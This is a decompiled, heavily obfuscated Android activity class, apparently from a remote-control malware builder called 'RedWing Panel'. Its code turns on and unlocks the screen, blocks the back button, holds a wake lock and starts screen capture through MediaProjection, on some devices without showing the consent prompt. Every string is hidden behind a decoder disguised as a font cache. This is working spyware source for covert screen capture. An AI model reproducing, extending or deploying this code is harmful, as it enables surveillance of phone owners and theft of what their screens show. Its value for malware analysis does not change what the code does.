package app.mobilex.plus;

import android.content.Intent;
import android.media.projection.MediaProjectionConfig;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import androidx.activity.ComponentActivity;
import app.mobilex.plus.HandlerSJAdapter;
import app.mobilex.plus.services.ManagerUMController;
import app.mobilex.plus.util.TypefaceCache;
import v.s.eTeIZwLyooQrZ0ICI9i;
import v.s.euF5Udt5Rqv3Qmea;
import v.s.okc5AGRjqrud84oM6d;
import v.s.rA0nQJPukyMi;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class HandlerSJAdapter extends ComponentActivity {
    public static final String EWUjsTERgdPbSw3NNlN;
    public static Integer O2DHNSIGZlgPja7eqLgn;
    public static final String dTS0S7eC32ubQH54j36;
    public static volatile boolean rCHnHJBAlOpNI5;
    public static final String vIJudZvPyTuNp;
    public static Intent xfn2GJwmGqs7kWW;
    public static final String yTljMGnIibTRdOpSh4;
    public boolean DVTNwpDEVsUKuznof;
    public int H9XlUr4OeMJFiXK = 50;
    public int l1V0lQr6TbwNKqHfXNbb = 480;
    public final eTeIZwLyooQrZ0ICI9i K7eEOBPYP9VIoHWTe = Ee8d2j4S9Vm5yGuR(new rA0nQJPukyMi(4, this), new euF5Udt5Rqv3Qmea(2));

    static {
        TypefaceCache.obtain("000B00770055008300FC00BA00C0009400090057005F008600E000AB00D700B5");
        dTS0S7eC32ubQH54j36 = TypefaceCache.obtain("00320063005A008B00F900AB00CB");
        EWUjsTERgdPbSw3NNlN = TypefaceCache.obtain("00220075004F008E00FF00B1");
        yTljMGnIibTRdOpSh4 = TypefaceCache.obtain("00300062005A009500E4");
        vIJudZvPyTuNp = TypefaceCache.obtain("0030006200540097");
    }

    private static /* synthetic */ void hckq() {
    }

    @Override // androidx.activity.ComponentActivity, android.app.Activity
    public final void onBackPressed() {
    }

    @Override // androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            if (Build.VERSION.SDK_INT >= 27) {
                setShowWhenLocked(true);
                setTurnScreenOn(true);
            }
            getWindow().addFlags(2621568);
            ((PowerManager) getSystemService("power")).newWakeLock(805306394, TypefaceCache.obtain("001000750049008200F500B100F100A600330062004E009500F500E500E500A6002800730077008800F300B4")).acquire(3000L);
        } catch (Exception e) {
            TypefaceCache.obtain("0014007F0055008300FF00A8009200A1002F0077005C009400B000BA00C000B5002C0064000100C7");
            e.getMessage();
        }
        final int i = 0;
        if (getIntent().getBooleanExtra(TypefaceCache.obtain("003400770050008200CF00B000DC00AB003A"), false)) {
            TypefaceCache.obtain("003400770050008200CF00B000DC00AB003A00360056008800F400BA009220D3006300700052008900F900AC00DA00AE002D0071001B008600F600AB00D700B5006300650058009500F500BA00DC00E7002C0078001B008100FC00BE00D500B4");
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable(this) { // from class: v.s.Ac4G7pNYkCgcZ
                public final /* synthetic */ HandlerSJAdapter vekpFI4d1Nc4fakF;

                {
                    this.vekpFI4d1Nc4fakF = this;
                }

                @Override // java.lang.Runnable
                public final void run() {
                    Intent intentH9XlUr4OeMJFiXK;
                    switch (i) {
                        case 0:
                            HandlerSJAdapter handlerSJAdapter = this.vekpFI4d1Nc4fakF;
                            String str = HandlerSJAdapter.dTS0S7eC32ubQH54j36;
                            handlerSJAdapter.finish();
                            break;
                        default:
                            HandlerSJAdapter handlerSJAdapter2 = this.vekpFI4d1Nc4fakF;
                            String str2 = HandlerSJAdapter.dTS0S7eC32ubQH54j36;
                            if (jb8et6SZeK5TWMrJFxDX.gmNWMfvn6zlEj() && Build.VERSION.SDK_INT < 34) {
                                TypefaceCache.obtain("001600650052008900F700FF00C100B3002C0064005E008300B000AF00C000A8002900730058009300F900B000DC00E700270077004F008600BC00FF00DA00B1002D00750006");
                                HandlerSJAdapter.rCHnHJBAlOpNI5 = false;
                                if (handlerSJAdapter2.DVTNwpDEVsUKuznof) {
                                    String str3 = ManagerUMController.DVTNwpDEVsUKuznof;
                                    intentH9XlUr4OeMJFiXK = SbxdZ6Kq2uhHQ5RPRqm.MLSIo1htfMPWeB8V876L(handlerSJAdapter2, HandlerSJAdapter.O2DHNSIGZlgPja7eqLgn.intValue(), HandlerSJAdapter.xfn2GJwmGqs7kWW, handlerSJAdapter2.l1V0lQr6TbwNKqHfXNbb);
                                } else {
                                    String str4 = ManagerUMController.DVTNwpDEVsUKuznof;
                                    intentH9XlUr4OeMJFiXK = SbxdZ6Kq2uhHQ5RPRqm.H9XlUr4OeMJFiXK(handlerSJAdapter2, HandlerSJAdapter.O2DHNSIGZlgPja7eqLgn.intValue(), HandlerSJAdapter.xfn2GJwmGqs7kWW, handlerSJAdapter2.H9XlUr4OeMJFiXK);
                                }
                                handlerSJAdapter2.startForegroundService(intentH9XlUr4OeMJFiXK);
                                handlerSJAdapter2.finish();
                            } else {
                                try {
                                    MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) handlerSJAdapter2.getSystemService("media_projection");
                                    handlerSJAdapter2.K7eEOBPYP9VIoHWTe.vekpFI4d1Nc4fakF(Build.VERSION.SDK_INT >= 34 ? mediaProjectionManager.createScreenCaptureIntent(MediaProjectionConfig.createConfigForDefaultDisplay()) : mediaProjectionManager.createScreenCaptureIntent());
                                } catch (Exception e2) {
                                    TypefaceCache.obtain("001300640054008D00F500BC00C600AE002C0078001B009500F500AE00C700A200300062001B008200E200AD00DD00B500790036");
                                    e2.getMessage();
                                    HandlerSJAdapter.rCHnHJBAlOpNI5 = false;
                                    handlerSJAdapter2.finish();
                                }
                            }
                            break;
                    }
                }
            }, 500L);
            return;
        }
        String stringExtra = getIntent().getStringExtra(EWUjsTERgdPbSw3NNlN);
        if (stringExtra == null) {
            stringExtra = yTljMGnIibTRdOpSh4;
        }
        this.H9XlUr4OeMJFiXK = getIntent().getIntExtra(dTS0S7eC32ubQH54j36, 28 + 22);
        this.DVTNwpDEVsUKuznof = getIntent().getBooleanExtra(TypefaceCache.obtain("002B00600055008400CF00B200DD00A30026"), false);
        this.l1V0lQr6TbwNKqHfXNbb = getIntent().getIntExtra(TypefaceCache.obtain("003700770049008000F500AB00ED00B0002A0072004F008F"), 480);
        if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(stringExtra, yTljMGnIibTRdOpSh4)) {
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(stringExtra, vIJudZvPyTuNp)) {
                String str = ManagerUMController.DVTNwpDEVsUKuznof;
                Intent intent = new Intent(this, (Class<?>) ManagerUMController.class);
                intent.putExtra(ManagerUMController.yTljMGnIibTRdOpSh4, ManagerUMController.O2DHNSIGZlgPja7eqLgn);
                startService(intent);
                finish();
                return;
            }
            return;
        }
        String str2 = ManagerUMController.DVTNwpDEVsUKuznof;
        if (ManagerUMController.ECwLkmPW1UKz7J6E && ManagerUMController.fivkjwgu2UdAtiY != null) {
            TypefaceCache.obtain("000E00770055008600F700BA00C00092000E00550054008900E400AD00DD00AB002F0073004900C700F100B300C000A200220072004200C700E200AA00DC00A9002A0078005C00CB00B000AC00D900AE003300660052008900F7");
            finish();
        } else if (rCHnHJBAlOpNI5) {
            TypefaceCache.obtain("001300730049008A00F900AC00C100AE002C0078001B008600FC00AD00D700A60027006F001B008500F500B600DC00A000630064005E009600E500BA00C100B300260072001700C700E300B400DB00B70033007F00550080");
            finish();
        } else {
            final int i2 = 1;
            rCHnHJBAlOpNI5 = true;
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable(this) { // from class: v.s.Ac4G7pNYkCgcZ
                public final /* synthetic */ HandlerSJAdapter vekpFI4d1Nc4fakF;

                {
                    this.vekpFI4d1Nc4fakF = this;
                }

                @Override // java.lang.Runnable
                public final void run() {
                    Intent intentH9XlUr4OeMJFiXK;
                    switch (i2) {
                        case 0:
                            HandlerSJAdapter handlerSJAdapter = this.vekpFI4d1Nc4fakF;
                            String str3 = HandlerSJAdapter.dTS0S7eC32ubQH54j36;
                            handlerSJAdapter.finish();
                            break;
                        default:
                            HandlerSJAdapter handlerSJAdapter2 = this.vekpFI4d1Nc4fakF;
                            String str4 = HandlerSJAdapter.dTS0S7eC32ubQH54j36;
                            if (jb8et6SZeK5TWMrJFxDX.gmNWMfvn6zlEj() && Build.VERSION.SDK_INT < 34) {
                                TypefaceCache.obtain("001600650052008900F700FF00C100B3002C0064005E008300B000AF00C000A8002900730058009300F900B000DC00E700270077004F008600BC00FF00DA00B1002D00750006");
                                HandlerSJAdapter.rCHnHJBAlOpNI5 = false;
                                if (handlerSJAdapter2.DVTNwpDEVsUKuznof) {
                                    String str5 = ManagerUMController.DVTNwpDEVsUKuznof;
                                    intentH9XlUr4OeMJFiXK = SbxdZ6Kq2uhHQ5RPRqm.MLSIo1htfMPWeB8V876L(handlerSJAdapter2, HandlerSJAdapter.O2DHNSIGZlgPja7eqLgn.intValue(), HandlerSJAdapter.xfn2GJwmGqs7kWW, handlerSJAdapter2.l1V0lQr6TbwNKqHfXNbb);
                                } else {
                                    String str6 = ManagerUMController.DVTNwpDEVsUKuznof;
                                    intentH9XlUr4OeMJFiXK = SbxdZ6Kq2uhHQ5RPRqm.H9XlUr4OeMJFiXK(handlerSJAdapter2, HandlerSJAdapter.O2DHNSIGZlgPja7eqLgn.intValue(), HandlerSJAdapter.xfn2GJwmGqs7kWW, handlerSJAdapter2.H9XlUr4OeMJFiXK);
                                }
                                handlerSJAdapter2.startForegroundService(intentH9XlUr4OeMJFiXK);
                                handlerSJAdapter2.finish();
                            } else {
                                try {
                                    MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) handlerSJAdapter2.getSystemService("media_projection");
                                    handlerSJAdapter2.K7eEOBPYP9VIoHWTe.vekpFI4d1Nc4fakF(Build.VERSION.SDK_INT >= 34 ? mediaProjectionManager.createScreenCaptureIntent(MediaProjectionConfig.createConfigForDefaultDisplay()) : mediaProjectionManager.createScreenCaptureIntent());
                                } catch (Exception e2) {
                                    TypefaceCache.obtain("001300640054008D00F500BC00C600AE002C0078001B009500F500AE00C700A200300062001B008200E200AD00DD00B500790036");
                                    e2.getMessage();
                                    HandlerSJAdapter.rCHnHJBAlOpNI5 = false;
                                    handlerSJAdapter2.finish();
                                }
                            }
                            break;
                    }
                }
            }, 500L);
        }
    }
}
